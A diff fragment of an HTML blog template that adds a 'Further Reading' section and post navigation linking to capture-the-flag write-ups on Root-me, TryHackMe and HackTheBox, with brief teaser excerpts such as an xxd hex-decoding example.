+
+  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
+    <h3 class="pt-2 mt-1 mb-4 ml-1"
+      data-toc-skip>Further Reading</h3>
+    <div class="card-deck mb-4">
+    
+      
+      
+      <div class="card">
+        <a href="/posts/writeup-root-me-Cryptography/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+-->
+
+
+
+
+
+<span class="timeago small"
+  >
+
+  
+  
+
+  
+    Feb  8
+  
+
+  <i class="unloaded">2021-02-08T00:00:00+07:00</i>
+
+</span>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Root-me Cryptography</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Encoding - ASCII
+In GNU/linux, you can use the xxd command :
+$ echo "4C6520666C6167206465206365206368616C6C656E6765206573743A203261633337363438316165353436636436383964356239313237356433323465" | xx...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      
+      
+      <div class="card">
+        <a href="/posts/writeup-root-me-webclient/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+-->
+
+
+
+
+
+<span class="timeago small"
+  >
+
+  
+  
+
+  
+    Feb  8
+  
+
+  <i class="unloaded">2021-02-08T00:00:00+07:00</i>
+
+</span>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Root-me Client</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                HTML - disabled buttons
+All you have to do is open a browser inspectior of your choosing and examine the code. (If you are using chrome, you can get to this by pressing Ctrl + Shift + I, or by righ...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      
+      
+      <div class="card">
+        <a href="/posts/writeup-tryhackme-en-pass/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+-->
+
+
+
+
+
+<span class="timeago small"
+  >
+
+  
+  
+
+  
+    Feb 14
+  
+
+  <i class="unloaded">2021-02-14T00:00:00+07:00</i>
+
+</span>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme En-pass</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Introduction
+This is partical room from tryhackme entitled En-pass with Medium difficulty. In this room we will learn about web exploitation and privilage escalation . room link here
+
+Enumeration
+
+...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+    </div> <!-- .card-deck -->
+  </div> <!-- #related-posts -->
+
+
+
+    <!--
+  Navigation buttons at the bottom of the post.
+-->
+
+<div class="post-navigation d-flex justify-content-between">
+  
+  <a href="/posts/writeup-root-me-webclient/" class="btn btn-outline-primary"
+    prompt="Older">
+    <p>Root-me Client</p>
+  </a>
+  
+
+  
+  <a href="/posts/writeup-hackthebox-delivery/" class="btn btn-outline-primary"
+    prompt="Newer">
+    <p>Hackthebox Delivery</p>
+  </a>
+  
+
 </div>
 
 
+    
+
+    </div> <!-- #post-extend-wrapper -->
+
+  </div> <!-- .col-* -->
+
+</div> <!-- .row -->
 
 
 
